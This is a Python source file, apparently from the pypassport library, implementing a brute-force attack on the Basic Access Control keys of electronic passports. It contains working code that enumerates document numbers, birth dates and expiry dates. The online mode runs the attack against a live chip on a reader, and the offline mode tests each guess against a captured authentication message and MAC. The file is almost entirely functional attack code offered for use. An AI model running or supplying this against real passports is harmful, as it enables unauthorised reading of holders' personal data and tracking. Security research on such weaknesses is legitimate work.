from __future__ import annotations

import os
import time
import datetime
import re
import logging

from hashlib import sha1
from Crypto.Cipher import DES3
from Crypto.Cipher import DES

from pypassport.iso7816 import ISO7816, ISO7816Exception
from pypassport.iso9797 import mac, pad
from pypassport.hex_utils import bin_to_hex_rep, hex_rep_to_bin


class BruteForceException(Exception):
    pass


class BruteForce:
    """
    Brute-force attack against the BAC key derivation over a range of MRZ values.

    BAC keys are derived from the document number, date of birth and date of
    expiry only, which often carries far less entropy than a 56-bit key. The two
    main methods are:
     - L{exploit}: online attack; tries every MRZ in the configured range against
       the passport on the reader until a BAC mutual authentication succeeds.
     - L{exploit_offline}: offline attack; given a message/MAC pair captured from
       a legitimate session, tries every MRZ in the range until the recomputed
       MAC matches (no live passport needed).

    Configure the search space with L{set_id}, L{set_dob} and L{set_exp_date}.
    """

    KENC = b"\x00\x00\x00\x01"
    KMAC = b"\x00\x00\x00\x02"

    def __init__(self, iso7816=None):
        # iso7816 is only needed for the online L{exploit}; the offline attack
        # works without a reader.
        self._iso7816: ISO7816 | None = iso7816
        if iso7816 is not None:
            if not isinstance(self._iso7816, ISO7816):
                raise BruteForceException("The sublayer iso7816 is not available")
            self._iso7816.rst_connection()

        self._id_low: str | None = None
        self._id_high: str | None = None
        self._dob_low: datetime.date | None = None
        self._dob_high: datetime.date | None = None
        self._exp_date_low: datetime.date | None = None
        self._exp_date_high: datetime.date | None = None

        self._weighting = [7, 3, 1]
        self._id_values = {
            "<": 0,
            "0": 0,
            "1": 1,
            "2": 2,
            "3": 3,
            "4": 4,
            "5": 5,
            "6": 6,
            "7": 7,
            "8": 8,
            "9": 9,
            "A": 10,
            "B": 11,
            "C": 12,
            "D": 13,
            "E": 14,
            "F": 15,
            "G": 16,
            "H": 17,
            "I": 18,
            "J": 19,
            "K": 20,
            "L": 21,
            "M": 22,
            "N": 23,
            "O": 24,
            "P": 25,
            "Q": 26,
            "R": 27,
            "S": 28,
            "T": 29,
            "U": 30,
            "V": 31,
            "W": 32,
            "X": 33,
            "Y": 34,
            "Z": 35,
        }
        self._inv_id_values = [
            "0",
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]

    def twodyear(self, year):
        today = datetime.date.today()
        todayyear = today.strftime("%y")
        if year > todayyear:
            return "19" + year
        else:
            return "20" + year

    def set_id(self, low=None, high=None):
        """
        Set the range of the document number (min 0, max ZZZZZZZZZZ).

        @param low: (optional) the minimum
        @type low: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param high: (optional) the maximum
        @type high: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        """

        logging.debug("Set ID:")
        logging.debug("\tLow: {0}".format(low))
        logging.debug("\tHigh: {0}".format(high))

        if low is None:
            low = "0"

        if high is None:
            if low == "0":
                high = "ZZZZZZZZZ"
            else:
                high = low

        self._id_low = low.upper()
        self._id_high = high.upper()

        if high:
            (value_low, value_high) = self._weight_value(self._id_low, self._id_high)
            if value_low > value_high:
                (self._id_high, self._id_low) = (self._id_low, self._id_high)

        logging.debug("Effective ID")
        logging.debug("\tLow: {0}".format(self._id_low))
        logging.debug("\tHigh: {0}".format(self._id_high))

    def set_dob(self, low=None, high=None):
        """
        Set the range of the date of birth (min today - 100 years, max today).

        @param low: (optional) the minimum
        @type low: String (YY/MM/DD)
        @param high: (optional) the maximum
        @type high: String (YY/MM/DD)
        """

        logging.debug("Set Date of birth:")
        logging.debug("\tLow: {0}".format(low))
        logging.debug("\tHigh: {0}".format(high))

        today = datetime.date.today()

        if high is None:
            if low is None:
                high = today.strftime("%y%m%d")
            else:
                high = None

        if low is None:
            low_date = datetime.date(today.year - 99, today.month, today.day)
            low = low_date.strftime("%y%m%d")

        date_cmp = [self.twodyear(low[0:2]), low[2:4], low[4:6]]
        self._dob_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        if high:
            date_cmp = [self.twodyear(high[0:2]), high[2:4], high[4:6]]
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
        else:
            self._dob_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        if self._dob_low > self._dob_high:
            (self._dob_high, self._dob_low) = (self._dob_low, self._dob_high)

        logging.debug("Effective date of birth:")
        logging.debug("\tLow: {0}".format(self._dob_low.strftime("%Y/%m/%d")))
        logging.debug("\tHigh: {0}".format(self._dob_high.strftime("%Y/%m/%d")))

    def set_exp_date(self, low=None, high=None):
        """
        Set the range of the date of expiration (min today, max today + 10 years).

        @param low: (optional) the minimum
        @type low: String (YY/MM/DD)
        @param high: (optional) the maximum
        @type high: String (YY/MM/DD)
        """

        logging.debug("Set expriration date:")
        logging.debug("\tLow: {0}".format(low))
        logging.debug("\tHigh: {0}".format(high))

        today = datetime.date.today()
        tmp = low

        if low is None:
            if high is None:
                low_date = datetime.date(today.year - 10, today.month, today.day)
                low = low_date.strftime("%y%m%d")
            else:
                low_date = datetime.date(int(high[:4]) - 10, int(high[5:7]), int(high[8:10]))
                low = low_date.strftime("%y%m%d")

        if high is None:
            if tmp is None:
                high_date = datetime.date(today.year + 10, today.month, today.day)
                high = high_date.strftime("%y%m%d")
            else:
                high = low

        date_cmp = [self.twodyear(low[0:2]), low[2:4], low[4:6]]
        self._exp_date_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        date_cmp = [self.twodyear(high[0:2]), high[2:4], high[4:6]]
        self._exp_date_high = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))

        if self._exp_date_low > self._exp_date_high:
            (self._exp_date_high, self._exp_date_low) = (self._exp_date_low, self._exp_date_high)

        logging.debug("Effective expiration date:")
        logging.debug("\tLow: {0}".format(self._exp_date_low.strftime("%Y/%m/%d")))
        logging.debug("\tHigh: {0}".format(self._exp_date_high.strftime("%Y/%m/%d")))

    def check(self):
        """
        Check if all parameters (Document number, date of birth and expriration date) are correct

        @return: A boolean whether the paramaters are set properly
        """

        logging.debug("Check:")

        check = True
        error = ""
        pattern_id = "^[0-9A-Z<]{1,9}$"
        reg = re.compile(pattern_id)

        if not isinstance(self._id_low, str) or not reg.match(self._id_low):
            check = False
            error += "Wrong parameter (ID low: {0})\n".format(self._id_low)
            logging.debug("\tWrong ID low")
        if not isinstance(self._id_high, str) or not reg.match(self._id_high):
            check = False
            error += "Wrong parameter (ID high: {0})\n".format(self._id_high)
            logging.debug("\tWrong ID high")

        if not isinstance(self._dob_low, datetime.date):
            check = False
            error += "dob l\n"
            error += "Wrong parameter (date of birth low: {0})\n".format(self._dob_low)
        if not isinstance(self._dob_high, datetime.date):
            check = False
            error += "dob h\n"
            error += "Wrong parameter (date of birth high: {0})\n".format(self._dob_high)

        if not isinstance(self._exp_date_low, datetime.date):
            check = False
            error += "Wrong parameter (Expiratin date low: {0})\n".format(self._exp_date_low)
            logging.debug("\tWrong expiration date low")
        if not isinstance(self._exp_date_high, datetime.date):
            check = False
            error += "Wrong parameter (Expiratin date high: {0})\n".format(self._exp_date_high)
            logging.debug("\tWrong expiration date high")

        return check, error

    def get_id_stat(self):
        """
        Get the maximum and the minimum in the passport document range set together with the entropy.

        @return: A set composed of (minimum[String], maximum[String], entropy[Integer])
        """
        id_low, id_high = self._require_id_range()
        (value_low, value_high) = self._weight_value(id_low, id_high)
        entropy = value_high - value_low + 1
        return (id_low, id_high, entropy)

    def get_dob_stat(self):
        """
        Get the maximum and the minimum in the date of birth range set together with the entropy.

        @return: A set composed of (minimum[datetime.date], maximum[datetime.date], entropy[Integer])
        """
        dob_low, dob_high = self._require_dob_range()
        delta = dob_high - dob_low
        entropy = delta.days + 1
        return (dob_low, dob_high, entropy)

    def get_exp_date_stat(self):
        """
        Get the maximum and the minimum in the expiration date range set together with the entropy.

        @return: A set composed of (minimum[datetime.date], maximum[datetime.date], entropy[Integer])
        """
        exp_date_low, exp_date_high = self._require_exp_date_range()
        delta = exp_date_high - exp_date_low
        entropy = delta.days + 1
        return (exp_date_low, exp_date_high, entropy)

    def _require_id_range(self) -> tuple[str, str]:
        if self._id_low is None or self._id_high is None:
            raise BruteForceException("Document number range is not initialized")
        return self._id_low, self._id_high

    def _require_dob_range(self) -> tuple[datetime.date, datetime.date]:
        if self._dob_low is None or self._dob_high is None:
            raise BruteForceException("Date of birth range is not initialized")
        return self._dob_low, self._dob_high

    def _require_exp_date_range(self) -> tuple[datetime.date, datetime.date]:
        if self._exp_date_low is None or self._exp_date_high is None:
            raise BruteForceException("Expiration date range is not initialized")
        return self._exp_date_low, self._exp_date_high

    def _require_search_space(self) -> tuple[str, str, datetime.date, datetime.date, datetime.date, datetime.date]:
        id_low, id_high = self._require_id_range()
        dob_low, dob_high = self._require_dob_range()
        exp_date_low, exp_date_high = self._require_exp_date_range()
        return id_low, id_high, dob_low, dob_high, exp_date_low, exp_date_high

    def _require_iso7816(self) -> ISO7816:
        if self._iso7816 is None:
            raise BruteForceException("The sublayer iso7816 is not available")
        return self._iso7816

    def _weight_value(self, low, high):
        """
        Convert a set a value [0-9A-Z<] in decimal value
        < = 0
        0 = 0
        ...
        9 = 9
        A = 10
        ...
        Z = 35

        @param low: the minimum
        @type low: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param high: the maximum
        @type high: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: A set composed of (decimal value of low, decimal value of high)
        """

        len_low = len(low)
        len_high = len(high)

        value_low = 0
        value_high = 0
        i = 1
        while i <= len_low:
            value_low += self._id_values[low[-i]] * pow(36, i - 1)
            i += 1

        i = 1
        while i <= len_high:
            value_high += self._id_values[high[-i]] * pow(36, i - 1)
            i += 1

        return (value_low, value_high)

    def _calcul_check_digit(self, value):
        """
        Create check digit for a value of the MRZ

        @param value: initial value
        @type value: String
        @return: Check digit
        @rtype: String

        @note: Code fragment from the pyPassport.mrz.MRZ class
        """
        cpt = 0
        res = 0
        for x in value:
            tmp = self._id_values[str(x)] * self._weighting[cpt % 3]
            res += tmp
            cpt += 1
        return str(res % 10)

    def _build_mrz(self, id_pass, dob, exp, pers_num="<<<<<<<<<<<<<<"):
        """
        Create the MRZ based on:
         - the document number
         - the date of birth
         - the expiration date
         - (optional) personal number

        @param id_pass: Document number
        @type id_pass: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
        @param dob: Date of birth
        @type dob: String (YYMMDD)
        @param exp: Expiration date
        @type exp: String (YYMMDD)
        @param pers_num: (optional) Personal number. If not set, value = "<<<<<<<<<<<<<<"
        @type pers_num: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: A String "PPPPPPPPPPCXXXBBBBBBCXEEEEEECNNNNNNNNNNNNNNCC"
        """

        id_pass_full = id_pass + (9 - len(id_pass)) * "<" + self._calcul_check_digit(id_pass)
        dob_full = dob + self._calcul_check_digit(dob)
        exp_full = exp + self._calcul_check_digit(exp)
        pers_num_full = pers_num + self._calcul_check_digit(pers_num)
        return (
            id_pass_full
            + "???"
            + dob_full
            + "?"
            + exp_full
            + pers_num_full
            + self._calcul_check_digit(id_pass_full + dob_full + exp_full + pers_num_full)
        )

    def _next_id_value(self, value):
        """
        Function that increment the value of document number/personal number

        @param value: Value to increment
        @type value: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)

        @return: The incremented value
        """
        len_value = len(value)
        dec_value = 0
        new_value = ""

        i = 1
        while i <= len_value:
            dec_value += self._id_values[value[-i]] * pow(36, i - 1)
            i += 1
        dec_value += 1

        while dec_value:
            new_value = self._inv_id_values[dec_value % 36] + new_value
            dec_value //= 36

        return new_value

    def _gen_kseed(self, kmrz):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        if isinstance(kmrz, str):
            kmrz = kmrz.encode()
        kseedhash = sha1(kmrz)
        kseed = kseedhash.digest()
        return kseed[:16]

    def _key_derivation(self, kseed, c):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        d = kseed + c
        h = sha1(d).digest()

        Ka = h[:8]
        Kb = h[8:16]

        Ka = self._des_parity(Ka)
        Kb = self._des_parity(Kb)

        return Ka + Kb

    def _des_parity(self, data):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """
        adjusted = b""
        for byte in data:
            y = byte & 0xFE
            parity = 0
            for z in range(8):
                parity += y >> z & 1
            adjusted += bytes([y + (not parity % 2)])
        return adjusted

    def _authentication(self, rnd_icc, kenc, kmac):
        """
        @note: Code fragment from the pyPassport.doc9303.bac.BAC class
        """

        rnd_ifd = os.urandom(8)
        kifd = os.urandom(16)

        s = rnd_ifd + rnd_icc + kifd

        tdes = DES3.new(kenc, DES.MODE_CBC, b"\x00\x00\x00\x00\x00\x00\x00\x00")
        eifd = tdes.encrypt(s)

        mifd = mac(kmac, pad(eifd))

        cmd_data = eifd + mifd

        return cmd_data

    def _send_cmd_data(self, cmd_data):
        """Send the EXTERNAL/MUTUAL AUTHENTICATE command data to the chip."""
        iso7816 = self._require_iso7816()
        toSend = iso7816.mutual_authentication(bin_to_hex_rep(cmd_data))
        return iso7816.transmit(toSend, "Mutual Authentication")

    def init_offline(self, mrz):
        """
        Build a sample message/MAC pair for the offline attack.

        The real offline attack needs a message/MAC pair captured from a
        legitimate session; this helper forges an equivalent pair from a known
        MRZ so the offline brute force can be exercised and tested.

        @param mrz: A full MRZ string.
        @type mrz: String
        @return: The message/MAC pair as a hex string, suitable for
            L{exploit_offline}.
        """
        kmrz = mrz[0:10] + mrz[13:20] + mrz[21:28]
        kseed = self._gen_kseed(kmrz)
        kenc = self._key_derivation(kseed, BruteForce.KENC)
        kmac = self._key_derivation(kseed, BruteForce.KMAC)

        rnd_icc = os.urandom(8)
        cmd_data = self._authentication(rnd_icc, kenc, kmac)

        return bin_to_hex_rep(cmd_data)

    ########################
    #        ONLINE        #
    ########################

    def exploit(self, reset=False):
        """
        Attempt a brute force attack in a BAC
        It tries a series of MRZ until the BAC succeeds or if out of the range

        @param reset: State if the connection needs to be reset after each try
        @type reset: Boolean

        @return: The MRZ found (or False if not found)
        """

        logging.info("Online BAC brute force: start")

        iso7816 = self._require_iso7816()
        cur_id, max_id, dob_low, max_dob, exp_date_low, max_exp = self._require_search_space()
        found = False

        starttime = time.time()
        while not found:
            cur_dob = dob_low
            while not found:
                cur_exp = exp_date_low
                while not found:
                    mrz = self._build_mrz(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
                    logging.debug("\tTry: {0}".format(mrz))
                    kmrz = (
                        cur_id
                        + (9 - len(cur_id)) * "<"
                        + self._calcul_check_digit(cur_id)
                        + cur_dob.strftime("%y%m%d")
                        + self._calcul_check_digit(cur_dob.strftime("%y%m%d"))
                        + cur_exp.strftime("%y%m%d")
                        + self._calcul_check_digit(cur_exp.strftime("%y%m%d"))
                    )
                    kseed = self._gen_kseed(kmrz)
                    kenc = self._key_derivation(kseed, BruteForce.KENC)
                    kmac = self._key_derivation(kseed, BruteForce.KMAC)

                    rnd_icc = iso7816.get_challenge()

                    try:
                        self._send_cmd_data(self._authentication(rnd_icc, kenc, kmac))
                        found = mrz
                        logging.info("Found! MRZ: {0}".format(mrz))
                    except ISO7816Exception:
                        if reset:
                            iso7816.rst_connection()
                        pass

                    if cur_exp == max_exp:
                        break
                    cur_exp += datetime.timedelta(1)

                if cur_dob == max_dob:
                    break
                cur_dob += datetime.timedelta(1)

            if cur_id == max_id:
                break
            cur_id = self._next_id_value(cur_id)

        logging.info("Elapsed time: {0:.1f}s".format(time.time() - starttime))
        return found

    #########################
    #        OFFLINE        #
    #########################

    def exploit_offline(self, response):
        """
        An offline brute force attack takes a nonce and a response.
        Get an encrypted message + mac based on the response
        Based on the encrypted message, it uses a series of MRZ to generate a MAC
        If the MAC generated match the mac, it uses the MRZ to decrypt the encrypted message.
        If the decrypted message embeds the nonce, the MRZ is the one from the passport that generated the nonce.

        @param nonce: A nonce generated by a passport during a BAC
        @type nonce: String of 16chars (64bits in hex)
        @param nonce: The nonce response generated by a legitimate reader
        @type nonce: String of 80chars (256bits encrypted message + 64bits mac = 320bits in hex)

        @return: The MRZ found (or False if not found)
        """

        logging.info("Offline BAC brute force: start")

        message_bin = hex_rep_to_bin(response[:64])
        mac_bin = hex_rep_to_bin(response[64:])

        cur_id, max_id, dob_low, max_dob, exp_date_low, max_exp = self._require_search_space()
        found = False

        starttime = time.time()
        while not found:
            cur_dob = dob_low
            while not found:
                cur_exp = exp_date_low
                while not found:
                    mrz = self._build_mrz(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
                    logging.debug("\tTry: {0}".format(mrz))
                    kmrz = (
                        cur_id
                        + (9 - len(cur_id)) * "<"
                        + self._calcul_check_digit(cur_id)
                        + cur_dob.strftime("%y%m%d")
                        + self._calcul_check_digit(cur_dob.strftime("%y%m%d"))
                        + cur_exp.strftime("%y%m%d")
                        + self._calcul_check_digit(cur_exp.strftime("%y%m%d"))
                    )
                    kseed = self._gen_kseed(kmrz)
                    # kenc = self._key_derivation(kseed, BruteForce.KENC)
                    kmac = self._key_derivation(kseed, BruteForce.KMAC)

                    if mac_bin == mac(kmac, pad(message_bin)):
                        found = mrz
                        logging.info("Found! MRZ: {0}".format(mrz))

                    if cur_exp == max_exp:
                        break
                    cur_exp += datetime.timedelta(1)

                if cur_dob == max_dob:
                    break
                cur_dob += datetime.timedelta(1)

            if cur_id == max_id:
                break
            cur_id = self._next_id_value(cur_id)
        logging.info("Elapsed time: {0:.1f}s".format(time.time() - starttime))
        return found
